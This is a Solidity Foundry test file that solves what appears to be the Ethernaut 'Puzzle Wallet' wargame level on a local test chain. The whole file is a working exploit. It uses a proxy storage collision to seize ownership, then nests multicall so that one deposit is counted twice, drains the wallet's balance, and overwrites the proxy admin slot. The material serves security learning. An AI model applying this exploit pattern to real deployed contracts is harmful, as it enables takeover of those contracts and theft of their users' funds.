// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {DeployPuzzleWalletScript} from "@script/24_DeployPuzzleWallet.s.sol";

import {PuzzleProxy, PuzzleWallet} from "@main/24_PuzzleWallet.sol";

contract PuzzleWalletTest is Test, DeployPuzzleWalletScript {
    string mnemonic = "test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);

    address public attacker = address(11);

    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);

        DeployPuzzleWalletScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker, attacker);

        assertEq(PuzzleProxy(payable(address(walletChallenge))).admin(), deployer);
        assertEq(address(walletChallenge).balance, 0.001 ether);

        PuzzleProxy(payable(address(walletChallenge))).proposeNewAdmin(attacker);
        walletChallenge.addToWhitelist(attacker);

        bytes[] memory secondDepositCall = new bytes[](1);
        secondDepositCall[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, secondDepositCall);
        walletChallenge.multicall{value: 0.001 ether}(calls);

        assertEq(address(walletChallenge).balance, 0.002 ether);
        walletChallenge.execute(attacker, 0.002 ether, "");

        walletChallenge.setMaxBalance(uint256(uint160(attacker)));
        assertEq(PuzzleProxy(payable(address(walletChallenge))).admin(), attacker);
        assertEq(address(walletChallenge).balance, 0 ether);

        vm.stopPrank();
    }
}
